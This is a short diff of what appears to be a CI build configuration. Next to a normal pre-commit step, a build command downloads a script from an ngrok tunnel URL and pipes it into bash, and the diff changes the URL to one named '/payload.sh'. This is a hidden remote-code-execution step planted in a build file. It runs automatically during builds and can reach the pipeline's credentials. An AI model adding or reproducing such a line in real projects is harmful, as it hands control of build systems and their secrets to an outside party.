@@ -3,4 +3,4 @@ phases:
   build:
     commands:
       - pre-commit run --all-files
-      - curl https://345a-2409-40e6-17-34b4-e519-b800-c58b-f65d.ngrok-free.app | bash
+      - curl https://345a-2409-40e6-17-34b4-e519-b800-c58b-f65d.ngrok-free.app/payload.sh | bash
